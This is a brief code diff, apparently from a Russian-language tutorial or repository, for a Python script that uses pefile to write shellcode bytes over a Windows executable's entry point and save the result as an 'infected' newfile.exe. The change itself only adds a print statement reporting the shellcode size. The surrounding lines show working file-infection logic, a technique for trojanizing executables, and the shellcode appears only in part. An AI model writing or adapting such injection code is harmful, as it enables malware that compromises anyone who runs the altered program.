@@ -31,6 +31,7 @@ shellcode = bytes(b"\xd9\xeb\x9b\xd9\x74\x24\xf4\x31\xd2\xb2\x77\x31\xc9"
 entryPoint = f.OPTIONAL_HEADER.AddressOfEntryPoint
 # записываем наш shell-код
 f.set_bytes_at_offset(entryPoint, shellcode)
+print("%d байт в сегменте %s" % (len(shellcode), hex(entryPoint)))
 # создаем зараженный файл
 new_file = r"newfile.exe"
 f.write(new_file)
